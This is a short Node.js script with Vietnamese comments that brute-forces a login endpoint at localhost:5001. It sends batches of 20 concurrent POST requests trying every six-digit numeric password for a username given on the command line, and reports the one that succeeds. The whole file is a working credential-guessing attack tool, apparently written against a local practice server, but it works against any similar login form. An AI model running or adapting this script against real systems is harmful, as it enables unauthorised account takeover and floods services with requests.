const axios = require('axios');

async function bruteForce(username) {
    const batchSize = 20; // Số lượng requests gửi đồng thời
    const totalPasswords = 1000000; 
    const startTime = Date.now();

    for (let i = 260000; i < totalPasswords; i += batchSize) {
        const requests = [];

        for (let j = 0; j < batchSize; j++) {
            const password = (i + j).toString().padStart(6, '0');
            requests.push(axios.post("http://localhost:5001/login", { username, password }));
        }

        try {
            const responses = await Promise.all(requests);
            for (const [index, res] of responses.entries()) {
                if (res.data.result === 'success') {
                    console.log(`\n Password found: ${(i + index).toString().padStart(6, '0')}`);
                    console.log(`Time elapsed: ${(Date.now() - startTime) / 1000} seconds`);
                    return;
                }
            }
        } catch (error) {}

        if (i % 1000 === 0) {
            const elapsedTime = ((Date.now() - startTime) / 1000).toFixed(2);
            const progress = ((i / totalPasswords) * 100).toFixed(2);
            console.clear();
            console.log(`🚀 Progress: ${progress}%`);
            console.log(`⏳ Elapsed time: ${elapsedTime} seconds`);
        }
    }

    console.log(`Brute-force completed, but no password found.`);
}

// Nhập username từ command line
const username = process.argv[2];
if (!username) {
    console.log('Please provide a username');
    process.exit(1);
}

bruteForce(username);